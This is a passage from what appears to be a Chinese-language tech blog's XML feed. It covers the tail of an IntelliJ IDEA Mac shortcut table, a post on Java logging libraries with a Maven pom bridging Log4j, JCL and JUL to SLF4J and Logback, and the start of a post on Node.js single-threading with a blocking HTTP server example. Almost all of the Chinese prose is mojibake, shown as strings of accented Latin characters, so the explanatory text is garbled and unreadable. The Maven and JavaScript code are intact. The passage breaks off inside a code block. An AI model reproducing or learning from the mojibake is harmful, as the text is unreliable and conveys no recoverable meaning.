e</td><td>æ˜¾ç¤ºæœ€è¿‘æ‰“å¼€çš„æ–‡ä»¶è®°å½•åˆ—è¡¨</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + b&#x2F;é¼ æ ‡ç‚¹å‡»</td><td>è¿›å…¥å…‰æ ‡æ‰€åœ¨çš„æ–¹æ³•&#x2F;å˜é‡çš„æ¥å£æˆ–æ˜¯å®šä¹‰å¤„</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + j</td><td>æ’å…¥è‡ªå®šä¹‰åŠ¨æ€ä»£ç æ¨¡æ¿</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + f12&#x2F;7</td><td>æ˜¾ç¤ºç±»ç»“æ„ï¼ˆå±æ€§ã€æ–¹æ³•ï¼‰</td><td></td><td></td></tr><tr><td>cmd + u</td><td>å‰å¾€å½“å‰å…‰æ ‡æ‰€åœ¨æ–¹æ³•çš„çˆ¶ç±»çš„æ–¹æ³• &#x2F; æ¥å£å®šä¹‰</td><td></td><td></td></tr><tr><td>ctrl + j</td><td>æ˜¾ç¤ºå¸®åŠ©æ–‡æ¡£</td><td></td><td></td></tr><tr><td>ctrl + h</td><td>æ˜¾ç¤ºå½“å‰ç±»&#x2F;æ¥å£çš„å­ç±»æˆ–è€…å®ç°</td><td>â­ï¸</td><td></td></tr><tr><td>ctrl + enter</td><td>è‡ªåŠ¨ç”Ÿæˆ(get&#x2F;set)</td><td>â­ï¸</td><td></td></tr><tr><td>cmd + shift + n</td><td>æŸ¥æ‰¾æ–‡ä»¶</td><td></td><td></td></tr><tr><td>alt + shfit + â†‘</td><td>ä¸Šç§»ä¸€è¡Œ</td><td></td><td></td></tr><tr><td>alt + shift + â†“</td><td>ä¸‹ç§»ä¸€è¡Œ</td><td></td><td></td></tr><tr><td>alt + enter</td><td>å¯¼å…¥åŒ…</td><td></td><td></td></tr><tr><td>shift + f6</td><td>é‡å‘½åç±»ã€å˜é‡</td><td>â­ï¸</td><td></td></tr><tr><td>shift + cmd</td><td>å¼€å§‹æ–°çš„ä¸€è¡Œ</td><td></td><td></td></tr><tr><td>ctrl + shift + j</td><td>å°†ä»£ç æ‹¼æ¥æˆä¸€è¡Œ</td><td></td><td></td></tr><tr><td>ctrl + shift + f</td><td>å…¨å±€æŸ¥æ‰¾</td><td></td><td></td></tr><tr><td>ctrl + shift + r</td><td>å…¨å±€æ›¿æ¢</td><td></td><td></td></tr><tr><td>ctrl + alt + h</td><td>æ˜¾ç¤ºè°ƒç”¨å±‚æ¬¡ç»“æ„</td><td></td><td></td></tr></tbody></table><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://wiki.jikexueyuan.com/project/intellij-idea-tutorial/keymap-mac-introduce.html">ã€1ã€‘</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> keymap </tag>
            
            <tag> intellij </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java ä¸­çš„æ—¥å¿—åº“</title>
      <link href="/post/java-logging.html"/>
      <url>/post/java-logging.html</url>
      
        <content type="html"><![CDATA[<h3 id="Java-æ—¥å¿—åº“"><a href="#Java-æ—¥å¿—åº“" class="headerlink" title="Java æ—¥å¿—åº“"></a>Java æ—¥å¿—åº“</h3><p>Java æ‹¥æœ‰åŠŸèƒ½å’Œæ€§èƒ½éƒ½éå¸¸å¼ºå¤§çš„æ—¥å¿—åº“ã€‚æ¯”è¾ƒå¸¸è§çš„æœ‰ java.util.loggingï¼ˆjulï¼‰ã€Apache Common Loggingï¼ˆjclï¼‰ã€Apache Log4j 1.xã€Apache Log4j 2ã€SLF4Jã€Logbackã€‚</p><h3 id="æ—¥å¿—è§„èŒƒå’Œå®ç°"><a href="#æ—¥å¿—è§„èŒƒå’Œå®ç°" class="headerlink" title="æ—¥å¿—è§„èŒƒå’Œå®ç°"></a>æ—¥å¿—è§„èŒƒå’Œå®ç°</h3><p>åœ¨è¿™äº›å¸¸è§çš„ç±»åº“ä¸­å¯ä»¥åˆ†ä¸ºä¸¤ç±»ï¼Œä¸€ç±»æ˜¯è§„èŒƒï¼Œå¦ä¸€ç±»æ˜¯æ—¥å¿—å®ç°ã€‚  </p><p>æœ€å¼€å§‹ Java ä¸­æ²¡æœ‰æä¾›æ—¥å¿— APIï¼Œåæ¥ Apache æ¨å‡ºäº† Log4jï¼Œå¾ˆå¤šé¡¹ç›®å¼€å§‹ä½¿ç”¨äº† Log4j æ¥è®°å½•æ—¥å¿—ã€‚æ¥ç€ Sun åœ¨ Java1.4 ä¸­æ¨å‡ºäº† julã€‚ç°åœ¨å°±æœ‰ä¸¤ç§æ—¥å¿—å®ç°äº†ã€‚å¼€å§‹å¾ˆå¤šé¡¹ç›®ä¸­ç›´æ¥ä½¿ç”¨æ—¥å¿—å®ç°ï¼Œè¿™æ ·å¯¹åé¢åˆ‡æ¢æ—¥å¿—å®ç°å¾ˆä¸æ–¹ä¾¿ï¼Œè¿™æ—¶å€™ jcl å‡ºç°äº†ã€‚jcl åªæ˜¯å®šä¹‰äº†ä¸€å¥—æ—¥å¿—æ¥å£ï¼Œæ”¯æŒè¿è¡Œæ—¶åŠ¨æ€åŠ è½½æ—¥å¿—ç»„ä»¶çš„å®ç°ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨ä½ åº”ç”¨ä»£ç é‡Œï¼Œåªéœ€è°ƒç”¨Commons Loggingçš„æ¥å£ï¼Œåº•å±‚å®ç°å¯ä»¥æ˜¯ Log4jï¼Œä¹Ÿå¯ä»¥æ˜¯ julã€‚</p><p>åæ¥åˆå‡ºç°äº† SLF4Jï¼ˆæ¥å£ï¼‰ã€Logbackï¼ˆå®ç°ï¼‰ ä»¥åŠ Log4j çš„å‡çº§ç‰ˆ Log4j 2ï¼Œè¿™é‡Œé¢Log4j 2 åˆåˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼Œlog4j-apiã€log4j-coreã€‚log4j-api æ˜¯æ—¥å¿—æ¥å£ï¼Œlog4j-core æ˜¯æ—¥å¿—å®ç°ã€‚</p><h3 id="ç»Ÿä¸€"><a href="#ç»Ÿä¸€" class="headerlink" title="ç»Ÿä¸€"></a>ç»Ÿä¸€</h3><p>ä¸€ä¸ªé¡¹ç›®ä¸­å¦‚æœå­˜åœ¨å¤šç§æ—¥å¿—æ¥å£å’Œå®ç°æ˜¯å¾ˆæ··ä¹±çš„ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨å„ç§ Adapter å’Œ Bridge æŠŠæ—¥å¿—è¿æ¥èµ·æ¥ã€‚slf4j-XXX-version.jar å’Œ XXX-over-slf4j.jar å°±æ˜¯åšè¿™ç§äº‹æƒ…çš„ã€‚</p><p><img src="/images/v2-57092397ff9d7a69d359856ef19e769d_r.png"></p><blockquote><p>é¡¹ç›®ä¸­å¼•ç”¨æ—¥å¿—ç±»åº“æ—¶æ³¨æ„ä¸è¦é€ æˆæ—¥å¿—æµè½¬çš„æ­»å¾ªç¯</p></blockquote><p>æˆ‘ä»¬å¯ä»¥ç”¨ jcl-over-slf4j æ¥æ›¿æ¢ jclï¼Œä½¿ç”¨ log4j-over-slf4j æ¥æ›¿æ¢ log4jã€‚å¯ä»¥é€šè¿‡ <code> mvn dependency:tree</code> æ¥æ‰“å°å‡ºä¾èµ–å…³ç³»ã€‚æ’é™¤ä¾èµ–çš„ç¬¬ä¸‰æ–¹åº“ä¸­çš„ Log  ä¾èµ–ã€‚</p><p>ä¸‹é¢çš„ä¾‹å­æ˜¯æŠŠ log4jã€jcl å…¨éƒ¨é€šè¿‡æ¡¥æ¥å™¨å°†æ—¥å¿—è¾“å‡ºåˆ° SLF4Jï¼Œæœ€åé€šè¿‡ Logback è¾“å‡ºã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba.otter<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>canal.client<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.24<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ’é™¤æ—¥å¿—ç¬¬ä¸‰æ–¹åº“ä¸­çš„æ—¥å¿—ä¾èµ– --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.elasticsearch.client<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>transport<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">exclusions</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!-- æ’é™¤æ—¥å¿—ç¬¬ä¸‰æ–¹åº“ä¸­çš„æ—¥å¿—ä¾èµ– --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">exclusion</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">exclusion</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">exclusions</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- logging --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--log4j â†’ slf4j--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--log4j 2 â†’ slf4j--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.8.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jcl â†’ slf4j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jcl-over-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- jul â†’ slf4j --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jul-to-slf4j<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>ch.qos.logback<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>logback-classic<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">scope</span>&gt;</span>runtime<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="http://www.infoq.com/cn/articles/things-of-java-log-performance">ã€1ã€‘</a> <a href="http://blog.csdn.net/yycdaizi/article/details/8276265">ã€2ã€‘</a> <a href="http://leonmau.blog.51cto.com/2202260/808763">ã€3ã€‘</a> <a href="https://zhuanlan.zhihu.com/p/24272450">ã€4ã€‘</a> <a href="https://zhuanlan.zhihu.com/p/24275518">ã€5ã€‘</a> <a href="http://www.cnblogs.com/chenhongliang/p/5312517.html">ã€6ã€‘</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> log </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nodejs-single-threaded</title>
      <link href="/post/nodejs-single-threaded.html"/>
      <url>/post/nodejs-single-threaded.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Node.jsæ˜¯åœ¨å•çº¿ç¨‹é‡Œè¿è¡Œã€‚ä½ ä¸èƒ½å¹¶è¡Œä»»ä½•ä»£ç , ä¸‹é¢çš„ä¾‹å­ä¼šé˜»å¡ 5sã€‚</p><p>å½“æ”¶åˆ°ç¬¬ä¸€ä¸ªè¯·æ±‚åï¼ŒæœåŠ¡å™¨å¼€å§‹é˜»å¡ã€‚æ­¤æ—¶å†å‘ç¬¬äºŒä¸ªè¯·æ±‚ï¼ŒæœåŠ¡å™¨æ˜¯æ— æ³•å¤„ç†è¯·æ±‚çš„ã€‚å¾…ç¬¬ä¸€ä¸ªè¯·æ±‚å“åº”åï¼Œç¬¬äºŒä¸ªè¯·æ±‚æ‰å¼€å§‹å¤„ç†ã€‚å› ä¸ºå®ƒåªåœ¨ä¸€ä¸ªçº¿ç¨‹é‡Œè¿è¡Œä½ çš„ä»£ç ã€‚</p><p>ç¬¬ä¸€ä¸ªè¯·æ±‚ <code>Server Processing</code> èŠ±è´¹å¤§çº¦ 5sï¼Œç¬¬äºŒä¸ªèŠ±è´¹æ—¶é—´ä¸º 9.6s (åŠ ä¸Šæˆ‘ä»¬æ‰‹åŠ¨åˆ‡æ¢æ‰§è¡Œçš„æ—¶é—´ï¼Œçº¦ç­‰äº 10s)ã€‚ä»è¿™ä¸¤ä¸ªæ•°æ®å¯ä»¥çœ‹å‡º Node.js ä¸²è¡Œçš„ã€‚</p><p>æˆ‘ä»¬åº”è¯¥é¿å…åœ¨ç¨‹åºé‡Œé¢åšå¤§é‡çš„è®¡ç®—ï¼ŒCPU å¯†é›†å‹çš„ä»»åŠ¡åº”å½“é¿å…çš„ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> sleep = <span class="built_in">require</span>(<span class="string">&#x27;sleep&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = http.<span class="title function_">createServer</span>(<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> start = process.<span class="title function_">hrtime</span>();</span><br><span class="line">    sleep.<span class="title function_">sleep</span>(<span class="number">5</span>); <span class="comment">// é˜»å¡ 5s</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;end... %j&#x27;</span>, process.<span class="title function_">hrtime</span>(start));</span><br><span class="line">    res.<span class="title function_">end</span>();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">server.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server running at http://localhost:3000/&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><img src="/images/Ctf7gFWA4P.gif"></p><h3 id="Node-js-æ˜¯å•çº¿ç¨‹çš„ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç”¨å®ƒï¼Ÿ"><a href="#Node-js-æ˜¯å•çº¿ç¨‹çš„ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç”¨å®ƒï¼Ÿ" class="headerlink" title="Node.js æ˜¯å•çº¿ç¨‹çš„ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç”¨å®ƒï¼Ÿ"></a>Node.js æ˜¯å•çº¿ç¨‹çš„ï¼Œä¸ºä»€ä¹ˆæˆ‘ä»¬è¦ç”¨å®ƒï¼Ÿ</h3><p>ä¸‹é¢çš„ä¾‹å­æ˜¯æ ¹æ®æ ¹æ®æ¥æ”¶åˆ°çš„idï¼Œä»æ•°æ®åº“ä¸­æ‹¿åˆ°æ•°æ®å¹¶è¿”å›ã€‚æˆ‘ä»¬é¡¹ç›®å¤§éƒ¨åˆ†æƒ…å†µåšçš„äº‹æƒ…å’Œè¿™ä¸ªä¾‹å­æ˜¯ç±»ä¼¼çš„ï¼Œä»å‰ç«¯æ‹¿åˆ°æ•°æ®ï¼Œå»æ•°æ®åº“åšæ“ä½œã€‚   </p><p>è¿™é‡Œæˆ‘ä»¬éœ€è¦æ³¨æ„ï¼Œ<code>Node.js</code> é‡Œé¢çš„æ‰€æœ‰IOæ“ä½œéƒ½æ˜¯å¼‚æ­¥çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ä¸‹é¢ä»£ç ä¸­ <code>db.query</code> æ˜¯å¼‚æ­¥æ‰§è¡Œçš„ã€‚å½“æ‰§è¡Œå®Œè¿™ä¸€å¥åï¼Œæœ¬æ¬¡ <code>ä»»åŠ¡</code> å°±ç»“æŸäº†ï¼ŒæœåŠ¡å™¨å°±èƒ½å¤„ç†ä¸‹ä¸€ä¸ªè¯·æ±‚äº†ã€‚<br>ä¸€èˆ¬æˆ‘ä»¬æ‰§è¡Œ <code>5-9</code> è¿™å—çš„å¾ˆå¿«ï¼Œæ‰€ä»¥åœ¨å¤§éƒ¨åˆ†æµ‹è¯•ä¸­ <code>Node.js</code> çš„å¹¶å‘å¾ˆé«˜ã€‚  </p><blockquote><p>å¾ˆå¤šè¯­è¨€æ˜¯ä½¿ç”¨çš„çº¿ç¨‹æ± æ¥å¤„ç†ç½‘ç»œè¯·æ±‚ï¼Œä¸€ä¸ªçº¿ç¨‹å¤„ç†ä¸€ä¸ªè¯·æ±‚ã€‚çº¿ç¨‹æ± çš„å¤§å°å¾€å¾€ä¸ä¼šå¾ˆå¤§ã€‚</p></blockquote><p>ç­‰ <code>db.query</code> è¿”å›æ•°æ®åï¼Œ<code>response</code> æ‰èƒ½æ‹¿åˆ°æ•°æ®ï¼Œç„¶åå“åº”ç»™å‰ç«¯ã€‚æœ¬æ¬¡è¯·æ±‚å°±ç®—ç»“æŸäº†ã€‚</p><p>åœ¨éœ€è¦å¤šæ¬¡æ“ä½œæ•°æ®åº“çš„ä¸šåŠ¡ä¸­ï¼Œ<code>Node.js</code> ç›¸å¯¹äºå…¶ä»–è¯­è¨€å°±æœ‰äº›ä¼˜åŠ¿äº†ã€‚å‡è®¾ç°åœ¨æœ‰ä¸ªé€»è¾‘æ˜¯åˆ†é¡µï¼Œå¤§éƒ¨åˆ†çš„å†™æ³•æ˜¯ä¸¤æ¬¡æŸ¥è¯¢æ•°æ®åº“ã€‚ç¬¬ä¸€æ¬¡æŸ¥è¯¢countï¼Œç¬¬äºŒæ¬¡æŸ¥è¯¢æ•°æ®ã€‚åœ¨ <code>Java</code> æ­£å¸¸æƒ…å†µä¸‹ï¼Œå‘å‡ºæŸ¥è¯¢ count çš„è¯·æ±‚åï¼Œä¼šç­‰å¾…æ•°æ®åº“è¿”å›ç»“æœï¼Œç„¶ååœ¨å‘å‡ºæŸ¥è¯¢æ•°æ®çš„è¯·æ±‚ï¼Œæœ€åèŠ±è´¹çš„æ—¶é—´å°±æ˜¯äºŒè€…ç›¸åŠ ã€‚æŸ¥è¯¢ count å’Œè·å–æ•°æ®å¹¶æ²¡æœ‰ä¾èµ–å…³ç³»ã€‚å¦‚æœæˆ‘ä»¬ç”¨ <code>Node.js</code> æ—¶ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç®€å•çš„å¹¶è¡Œå»å‘å‡ºä¸¤ä¸ªæŸ¥è¯¢ã€‚è¿™æ ·èŠ±è´¹çš„æ—¶é—´å°±æ˜¯æœ€æ…¢çš„é‚£ä¸ªæŸ¥è¯¢ã€‚è¿™æ ·ï¼Œæˆ‘ä»¬çš„å“åº”å°±å¿«äº†ã€‚æ‰€ä»¥åœ¨å¾ˆå¤šå¯¹æ¯”æµ‹è¯•ä¸­ <code>Node.js</code> çš„ <code>QPS</code> å¾ˆé«˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span 